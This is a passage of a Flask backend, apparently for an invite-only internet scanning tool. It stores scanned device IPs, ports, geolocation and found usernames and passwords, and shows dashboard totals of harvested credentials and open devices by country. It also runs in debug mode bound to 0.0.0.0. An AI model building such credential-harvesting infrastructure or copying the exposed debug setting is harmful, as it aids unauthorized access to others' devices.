                for i, r in enumerate(all_results):
                    items.append({
                        "result_id": str(result_id),
                        "item_index": i,
                        "ip": r.get("ip"), "port": r.get("port"),
                        "url": r.get("url"), "device": r.get("device"),
                        "no_auth": r.get("no_auth"), "auth_found": r.get("auth_found"),
                        "username": r.get("username"), "password": r.get("password"),
                        "note": r.get("note"), "status_code": r.get("status_code"),
                        "country": r.get("country"), "country_code": r.get("country_code"),
                        "region_name": r.get("region"), "city": r.get("city"),
                        "lat": r.get("lat"), "lon": r.get("lon"),
                        "org": r.get("org"), "isp": r.get("isp"),
                        "as_info": r.get("as"),
                        "broken": False,
                    })
                supabase.table("scan_result_items").insert(items).execute()
            except Exception as e:
                print(f"[!] Stream scan DB save error: {e}")

        yield f"event: done\ndata: {json.dumps({'total_scanned': total, 'results_count': len(all_results)})}\n\n"

    return Response(event_stream(), mimetype="text/event-stream")

# ─────────────── Invite code management ───────────────

@app.route("/api/admin/invites", methods=["GET"])
@require_auth
def api_list_invites(user):
    try:
        resp = supabase.table("invite_codes").select("*").order("created_at", desc=True).execute()
        for r in resp.data:
            r["id"] = str(r["id"])
        return jsonify(resp.data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/admin/invites", methods=["POST"])
@require_auth
def api_create_invite(user):
    code = uuid.uuid4().hex[:8].upper()
    try:
        supabase.table("invite_codes").insert({
            "code": code, "status": "active", "issuer": user.id,
        }).execute()
        return jsonify({"status": "ok", "code": code})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ─────────────── Main route ───────────────

@app.route("/")
def index():
    if app.static_folder and os.path.exists(os.path.join(app.static_folder, 'index.html')):
        return app.send_static_file('index.html')
    return "Frontend not built. Please run 'npm run build-all' in the root directory.", 404

@app.route("/app")
def app_spa():
    if app.static_folder and os.path.exists(os.path.join(app.static_folder, 'index.html')):
        return app.send_static_file('index.html')
    return "Frontend not built. Please run 'npm run build-all' in the root directory.", 404

# ─────────────── Dashboard stats ───────────────

@app.route("/api/dashboard/stats", methods=["GET"])
@require_auth
def api_dashboard_stats(user):
    try:
        scans = supabase.table("scan_results").select("*").eq("user_id", user.id).order("created_at", desc=True).limit(100).execute()
        total_scans = len(scans.data)
        total_results = sum(r.get("results_count", 0) for r in scans.data)
        total_creds = sum(r.get("creds_count", 0) for r in scans.data)
        total_open = sum(r.get("open_count", 0) for r in scans.data)
        scan_ids = [str(r["id"]) for r in scans.data if r.get("results_count", 0) > 0]
        by_country = {}
        by_port = {}
        recent_items = []
        geo_points = []
        if scan_ids:
            items = supabase.table("scan_result_items").select("*").in_("result_id", scan_ids).order("item_index", desc=True).limit(2000).execute()
            seen_ips = set()
            countries_set = set()
            for it in items.data:
                lat = it.get("lat")
                lon = it.get("lon")
                if lat and lon:
                    geo_points.append({
                        "lat": lat, "lon": lon,
                        "ip": it.get("ip"), "port": it.get("port"),
                        "device": it.get("device"), "country_code": it.get("country_code"),
                        "org": it.get("org"), "isp": it.get("isp"),
                        "as_info": it.get("as"), "url": it.get("url"),
                        "auth_found": it.get("auth_found"), "no_auth": it.get("no_auth"),
                        "username": it.get("username"), "password": it.get("password"),
                    })
                cc = it.get("country_code") or ""
                if cc:
                    countries_set.add(cc)
                    if cc not in by_country:
                        by_country[cc] = {"code": cc, "count": 0, "creds": 0, "open": 0, "lat": lat, "lon": lon}
                    by_country[cc]["count"] += 1
                    if it.get("auth_found"): by_country[cc]["creds"] += 1
                    if it.get("no_auth"): by_country[cc]["open"] += 1
                port = it.get("port")
                if port:
                    ps = str(port)
                    by_port[ps] = by_port.get(ps, 0) + 1
                if it.get("ip"): seen_ips.add(it.get("ip"))
                if len(recent_items) < 20:
                    recent_items.append({
                        "ip": it.get("ip"), "port": it.get("port"),
                        "device": it.get("device"), "country_code": it.get("country_code"),
                        "auth_found": it.get("auth_found"), "no_auth": it.get("no_auth"),
                        "url": it.get("url"),
                    })
        country_list = sorted(by_country.values(), key=lambda x: x["count"], reverse=True)
        port_list = sorted([{"port": int(k), "count": v} for k, v in by_port.items()], key=lambda x: x["count"], reverse=True)
        return jsonify({
            "stats": {
                "total_scans": total_scans,
                "total_results": total_results,
                "total_creds": total_creds,
                "total_open": total_open,
                "countries_hit": len(countries_set),
                "unique_ips": len(seen_ips),
            },
            "by_country": country_list[:30],
            "by_port": port_list[:20],
            "recent": recent_items,
            "geo_points": geo_points,
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/health")
def api_health():
    return jsonify({
        "status": "ok",
        "time": datetime.now(timezone.utc).isoformat(),
        "version": "7.1",
        "supabase": bool(supabase),
        "invite_only": INVITE_ONLY,
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    debug = os.environ.get("VERCEL") != "1"
    print(f"[*] GYD on Supabase — http://0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, debug=debug)
